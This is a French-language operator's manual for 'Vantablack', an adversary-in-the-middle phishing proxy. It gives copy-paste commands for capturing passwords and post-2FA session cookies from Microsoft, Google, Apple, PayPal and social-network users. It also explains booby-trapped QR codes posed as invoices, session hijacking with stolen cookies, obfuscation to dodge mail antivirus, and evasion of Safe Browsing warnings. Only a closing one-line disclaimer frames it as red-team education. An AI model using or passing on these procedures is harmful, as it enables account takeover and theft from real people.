# 📕 MANUEL DES OPÉRATIONS OFFENSIVES - VANTABLACK BY THE SENEGALESEHITCH
**Version :** 5.0 (Hyperdrive)
**Niveau :** Débutant à Expert
**Langue :** Français

---

## 📑 TABLE DES MATIÈRES

1.  **Introduction & Concepts Clés**
    *   C'est quoi Vantablack ?
    *   Différence Local vs WAN
    *   Glossaire (Phishlet, Lure, Loot...)
2.  **Chapitre 1 : Installation & Démarrage (Zero to Hero)**
    *   Pré-requis (Mac, Linux, Windows)
    *   Installation pas à pas
    *   Vérification (Health Check)
3.  **Chapitre 2 : Architecture du Système**
    *   Le Cœur (Core)
    *   Les Phishlets (Scénarios)
    *   Le Coffre (Data)
4.  **Chapitre 3 : Configuration Réseau (WAN)**
    *   Méthode 1 : Tunneling (Ngrok/Cloudflare) - Gratuit & Rapide
    *   Méthode 2 : VPS + Domaine - Pro & Furtif
5.  **Chapitre 4 : Lancer une Attaque (Weaponization)**
    *   Commande `edge-run` détaillée
    *   Les Profils de Furtivité (`stealth`, `parano`...)
    *   Créer des pièges (`safe-qr`, Liens)
6.  **Chapitre 5 : Catalogue des Phishlets**
    *   Liste complète et commandes prêtes à l'emploi
    *   Microsoft, Google, Apple, etc.
7.  **Chapitre 6 : Exploitation & Loot**
    *   Suivre les victimes en direct
    *   Récupérer les identifiants
    *   Voler les sessions (Cookies)
8.  **Chapitre 7 : Techniques Avancées**
    *   Modifier un Phishlet (YAML)
    *   Obfuscation de Code (`mutate`)
    *   Reconnaissance Cible (`analyze`)
9.  **Chapitre 8 : Dépannage & FAQ**
    *   Erreurs courantes
    *   Solutions

---

## 1. 🌍 INTRODUCTION & CONCEPTS CLÉS

### ⚠️ Règle d'Or : La Syntaxe
Pour lancer une commande, vous devez **toujours** commencer par `./vanta.sh` suivi d'une **action** (comme `edge-run` ou `loot`).

| ✅ Correct | ❌ Incorrect | Pourquoi c'est faux ? |
| :--- | :--- | :--- |
| `./vanta.sh edge-run --tunnel ngrok` | `--tunnel ngrok` | Il manque le programme (`./vanta.sh`) et l'action (`edge-run`). |
| `./vanta.sh doctor` | `vanta.sh doctor` | Il manque le `./` au début. |
| `./vanta.sh loot` | `./vanta.sh --id 5` | Il manque l'action (`loot`) avant les options. |

### C'est quoi Vantablack ?
Vantablack est une plateforme "Man-in-the-Middle" (MitM). Contrairement aux vieux sites de phishing qui sont de simples copies statiques, Vantablack agit comme un **proxy transparent**.
1.  La victime se connecte sur Vantablack.
2.  Vantablack transmet la requête au VRAI site (ex: Microsoft).
3.  Le vrai site répond.
4.  Vantablack capture tout au passage (mots de passe, cookies 2FA) et renvoie la page à la victime.

**Résultat :** Même avec la double authentification (SMS/App), vous capturez la session.

### Glossaire
*   **Phishlet** : Un script YAML qui explique à Vantablack comment attaquer un site spécifique (ex: `microsoft.yaml`).
*   **Lure (Leurre)** : L'URL piégée que vous envoyez à la victime.
*   **Loot (Butin)** : Les données volées (Identifiants, Cookies).
*   **Tunnel** : Un pont qui rend votre serveur local accessible depuis Internet.

---

## 2. � CHAPITRE 1 : INSTALLATION & DÉMARRAGE

### Pré-requis
*   Un ordinateur (Mac, Linux, ou Windows avec WSL2).
*   Python 3.10 ou plus récent.
*   Git.

### Installation Pas à Pas

**1. Ouvrir le Terminal**
Sur Mac: `Cmd + Espace` -> Tapez "Terminal".

**2. Cloner le Projet**
```bash
git clone https://github.com/votre-repo/Vantablack.git
cd Vantablack
```

**3. Lancer le Script d'Installation Automatique**
Ce script va créer un environnement virtuel isolé et installer toutes les librairies nécessaires.
```bash
chmod +x setup_env.sh
./setup_env.sh
```
*Si tout est vert, c'est gagné.*

**4. Installer les Outils Tiers (Recommandé)**
Pour le mode WAN facile, installez Ngrok :
*   **Mac** : `brew install ngrok/ngrok/ngrok`
*   **Linux** : `snap install ngrok`

### Vérification (Health Check)
Lancez cette commande pour vérifier que tout fonctionne :
```bash
./vanta.sh doctor
```
Vous devriez voir un tableau avec des "OK" partout.

---

## 3. 🏗️ CHAPITRE 2 : ARCHITECTURE DU SYSTÈME

Comprendre les dossiers vous aidera à modifier le système.

*   `vanta.sh` : **Le Lanceur**. C'est le seul fichier que vous exécuterez.
*   `phishlets/` : **Les Scénarios**. Contient les fichiers `.yaml` (ex: `apple.yaml`, `google.yaml`). Vous pouvez les ouvrir avec un éditeur de texte pour voir comment ils fonctionnent.
*   `data/` : **Le Butin**.
    *   `sessions.json` : Contient toutes les infos volées.
*   `templates/` : **Les Pages Web**.
    *   `enterprise_login.html` : Une page de login générique ultra-crédible utilisée par défaut si le proxy échoue.
*   `core/` : **Le Moteur**. Ne touchez pas à ça sauf si vous êtes développeur.

---

## 4. 🌐 CHAPITRE 3 : CONFIGURATION RÉSEAU (WAN)

Pour attaquer quelqu'un en dehors de votre WiFi, il faut exposer le serveur.

### Méthode 1 : Le Tunneling (Débutant / Rapide)
C'est la méthode magique. Pas besoin d'ouvrir de ports sur la box.

1.  Créez un compte gratuit sur [ngrok.com](https://ngrok.com).
2.  Configurez votre token : `ngrok config add-authtoken VOTRE_TOKEN`
3.  Lancez Vantablack avec l'option `--tunnel ngrok`.

### Méthode 2 : VPS + Nom de Domaine (Expert / Furtif)
Pour les vraies missions Red Team.
1.  Louez un VPS (Ubuntu 22.04) chez DigitalOcean/Vultr (~5$/mois).
2.  Achetez un nom de domaine (ex: `security-check-login.com`).
3.  Pointez le DNS (A Record) vers l'IP du VPS.
4.  Installez Vantablack sur le VPS.
5.  Lancez sans tunnel, en écoutant sur le port 80 ou 443.

---

## 5. ⚔️ CHAPITRE 4 : LANCER UNE ATTAQUE

La commande principale est `edge-run`. C'est elle qui démarre le proxy et active les tunnels.

### Syntaxe Complète
La structure est toujours : `./vanta.sh [ACTION] [OPTIONS]`

```bash
# Exemple : Lancer une attaque Microsoft via Ngrok
./vanta.sh edge-run --name microsoft --tunnel ngrok
```
*   `./vanta.sh` : Le script lanceur.
*   `edge-run` : L'action à effectuer (lancer le proxy).
*   `--name microsoft` : Le phishlet à utiliser.
*   `--tunnel ngrok` : L'option pour ouvrir l'accès WAN.

### Options Indispensables

### Options Indispensables
*   `--name <nom>` : Le nom du phishlet (ex: `microsoft`).
*   `--tunnel <ngrok|cloudflared>` : Active le mode WAN.
*   `--profile <mode>` : Change le comportement du proxy.

### Les Profils de Furtivité (`--profile`)
*   `default` : Standard. Rapide et compatible.
*   `stealth` : **Recommandé**. Bloque les trackers, retire les en-têtes de sécurité bizarres.
*   `strict` : Très agressif. Bloque les polices, les grosses images. Peut casser le design du site.
*   `parano` : Mode "Guerre Nucléaire". Simule un vieux navigateur, bloque tout le superflu.

### Exemple Concret : Attaque Microsoft Furtive
```bash
./vanta.sh edge-run --name microsoft --tunnel ngrok --profile stealth
```

### 🔄 Comment changer de cible (Google, X, Facebook...) ?
C'est très simple : il suffit de remplacer `microsoft` par le nom du service que vous voulez attaquer.
*   Pour **X (Twitter)** : `./vanta.sh edge-run --name x --tunnel ngrok`
*   Pour **Google** : `./vanta.sh edge-run --name google --tunnel ngrok`
*   Pour **Facebook** : `./vanta.sh edge-run --name facebook --tunnel ngrok`

💡 **Astuce :** Pour voir la liste de tous les sites piratables disponibles, lancez :
```bash
./vanta.sh phishlets-list
```
Cela vous donnera les noms exacts à utiliser après `--name`.

### Créer un QR Code Piégé
Dans un **nouveau terminal** :
```bash
./vanta.sh safe-qr --url https://xxxx.ngrok-free.app --out facture_microsoft.png
```
Envoyez cette image à la cible.

---

## 6. 📚 CHAPITRE 5 : CATALOGUE DES PHISHLETS

Voici les commandes exactes à copier-coller pour chaque service.

### 🏢 Entreprise & Pro
*   **Microsoft 365 / Outlook** :
    `./vanta.sh edge-run --name microsoft --tunnel ngrok --profile stealth`
*   **Google Workspace / Gmail** :
    `./vanta.sh edge-run --name google --tunnel ngrok --profile stealth`
*   **LinkedIn** :
    `./vanta.sh edge-run --name linkedin --tunnel ngrok`
*   **Slack** :
    `./vanta.sh edge-run --name slack --tunnel ngrok`
*   **GitHub** :
    `./vanta.sh edge-run --name github --tunnel ngrok`

### 🛍️ Grand Public
*   **Apple ID / iCloud** :
    `./vanta.sh edge-run --name apple --tunnel ngrok`
*   **Amazon** :
    `./vanta.sh edge-run --name amazon --tunnel ngrok`
*   **PayPal** :
    `./vanta.sh edge-run --name paypal --tunnel ngrok`
*   **Dropbox** :
    `./vanta.sh edge-run --name dropbox --tunnel ngrok`

### 📱 Réseaux Sociaux
*   **Facebook** :
    `./vanta.sh edge-run --name facebook --tunnel ngrok`
*   **Instagram** :
    `./vanta.sh edge-run --name instagram --tunnel ngrok`
*   **X (Twitter)** :
    `./vanta.sh edge-run --name x --tunnel ngrok`
*   **TikTok** :
    `./vanta.sh edge-run --name tiktok --tunnel ngrok`

---

## 7. 💰 CHAPITRE 6 : EXPLOITATION & LOOT

Vous avez piégé quelqu'un. Et maintenant ?

### 1. Surveiller en Direct
Le terminal où tourne `edge-run` affichera des logs en temps réel :
*   `[+] POST /login - Credentials captured!` (Mot de passe attrapé)
*   `[+] Session captured!` (Cookies attrapés)

### 2. Lire le Butin (Loot)
Ouvrez un **nouveau terminal** et lancez :
```bash
./vanta.sh loot
```
Cela affiche la liste des victimes.

### 3. Voir les Mots de Passe & Cookies
Copiez l'ID de la session (colonne ID) et faites :
```bash
./vanta.sh loot --id <ID_DE_LA_SESSION>
```
Vous verrez :
*   `User`: `victime@entreprise.com`
*   `Pass`: `MonMotDePasse123!`
*   `Tokens`: `ESTSAUTH=...`

### 4. Utiliser les Cookies (Session Hijacking)
C'est le plus important. Même si la victime change son mot de passe, le cookie est souvent encore valide.
1.  Installez l'extension "Cookie-Editor" ou "EditThisCookie" sur votre navigateur.
2.  Allez sur le VRAI site (ex: `login.microsoftonline.com`).
3.  Ouvrez l'extension, faites "Import".
4.  Copiez-collez les tokens JSON affichés par la commande `loot`.
5.  Rafraîchissez la page. **BOOM**, vous êtes connecté sans mot de passe.

---

## 8. 🧠 CHAPITRE 7 : TECHNIQUES AVANCÉES

### Obfuscation de Code (`mutate`)
Pour éviter que vos fichiers HTML ou JS soient détectés par les antivirus de mail.
```bash
./vanta.sh mutate --file mon_script.js
```
Cela va créer une version illisible (`mon_script.js.mutated`) qui fait la même chose mais change de "signature" à chaque fois.

### Reconnaissance (`analyze`)
Avant d'attaquer, renseignez-vous sur la cible pour personnaliser l'attaque.
```bash
./vanta.sh analyze --target @elonmusk --platform twitter
```
Cela va sortir un fichier JSON avec des infos utiles pour le social engineering.

### Modifier un Phishlet
Ouvrez `phishlets/microsoft.yaml`. Vous verrez :
*   `proxy_hosts` : Les sous-domaines à imiter (login, www, account).
*   `sub_filters` : Les règles de remplacement de texte (remplacer "Microsoft" par "MonEntreprise" par exemple).
*   `auth_tokens` : Les noms des cookies à voler.

---

## 9. ❓ CHAPITRE 8 : DÉPANNAGE & FAQ

### Erreur : `zsh: command not found: --tunnel`
**Cause** : Vous avez tapé `--tunnel` comme une commande.
**Solution** : `--tunnel` est une **option** de `edge-run`. Vous devez taper : `./vanta.sh edge-run --tunnel ngrok ...`

### Erreur : `zsh: command not found: vanta.sh`
**Cause** : Le terminal ne trouve pas le script car il n'est pas dans le "PATH".
**Solution** : Ajoutez `./` devant le nom du fichier pour dire "dans ce dossier". Tapez `./vanta.sh` au lieu de `vanta.sh`.

### Erreur : `[Errno 48] address already in use`
**Cause** : Une autre campagne Vantablack tourne déjà en arrière-plan.
**Solution** : Tuez les anciens processus avec cette commande :
```bash
lsof -ti:8443 | xargs kill -9
```
Puis relancez votre attaque.

### Problème : "Command not found: ngrok"
**Solution** : Ngrok n'est pas installé. Refaites l'étape d'installation ou vérifiez que ngrok est dans votre PATH.

### Problème : Erreur 502 Bad Gateway
**Cause** : Vantablack n'arrive pas à contacter le vrai site (Microsoft/Google).
**Solution** : Vérifiez votre connexion internet. Parfois, les sites bloquent les IP de datacenters/VPN. Essayez de changer d'IP.

### Problème : La victime voit une page rouge "Site Dangereux"
**Cause** : Google Safe Browsing a détecté votre domaine Ngrok.
**Solution** :
1.  Changez de domaine Ngrok (relancez la commande).
2.  Passez à la méthode VPS + Nom de Domaine "propre".
3.  Utilisez un raccourcisseur d'URL (bit.ly) pour masquer le lien (solution temporaire).

### Problème : Je ne capture pas le 2FA
**Solution** : Le phishlet capture la *session* après le 2FA. Il faut attendre que la victime ait fini TOUT le processus de connexion. Si elle s'arrête au milieu, vous n'aurez pas le cookie final.

---

## 🔟 ANNEXE A : DICTIONNAIRE DES COMMANDES (COMPLET)

Voici la liste exhaustive de toutes les commandes disponibles via `./vanta.sh`.

| Commande | Description | Options Clés |
| :--- | :--- | :--- |
| **`edge-run`** | **LA commande principale.** Lance une attaque (proxy). | `--name <nom>` : Nom du phishlet<br>`--tunnel <ngrok\|cloudflared>` : Accès WAN<br>`--profile <stealth>` : Furtivité |
| **`loot`** | **Gère les données volées.** | `(vide)` : Liste les victimes<br>`--id <ID>` : Détails complets (mots de passe, cookies, frappes clavier)<br>`--export <fichier.json>` : Sauvegarde |
| **`safe-qr`** | **Génère un QR Code piégé.** | `--url <lien>` : Lien vers votre attaque<br>`--out <image.png>` : Fichier de sortie<br>`--logo <image.png>` : Incruster un logo au centre |
| **`mutate`** | **Obfuscation de code.** Rend un fichier illisible. | `--file <script.js>` : Fichier à obfusquer (crée un .mutated) |
| **`analyze`** | **Reconnaissance OSINT.** | `--target <@user>` : Cible<br>`--platform <twitter\|linkedin>` : Réseau social |
| **`phishlets-list`** | Affiche tous les phishlets installés. | *(Aucune)* |
| **`phishlets-validate`** | Vérifie la syntaxe de vos phishlets (utile si vous modifiez le YAML). | *(Aucune)* |
| **`phishlets-audit`** | Vérifie que vos phishlets ne contactent pas de sites interdits. | `--allow <domaines>` : Liste blanche |
| **`doctor`** | Diagnostic du système. Vérifie si tout est installé. | *(Aucune)* |
| **`init`** | Initialise la configuration (.env). À faire au premier lancement. | *(Interactif)* |
| **`scan-file`** | Scanne un fichier pour voir s'il est détectable par les antivirus. | `--file <fichier>` |
| **`safe-link`** | Génère un lien local de test (copié dans le presse-papier). | *(Aucune)* |
| **`demo`** | Lance un serveur de démo (API). | `--port <8000>` |
| **`edge-demo`** | Lance une démo du proxy avec un phishlet. | `--phishlet <fichier>` |
| **`setup`** | (Bêta) Prépare une nouvelle campagne. | `--name <nom>` |
| **`run`** | (Bêta) Lance une campagne planifiée. | `--campaign <id>` |

---

*DISCLAIMER : Ce projet est un outil éducatif et de test d'intrusion (Red Teaming). L'utiliser sur des cibles sans leur consentement écrit est illégal et puni par la loi.*
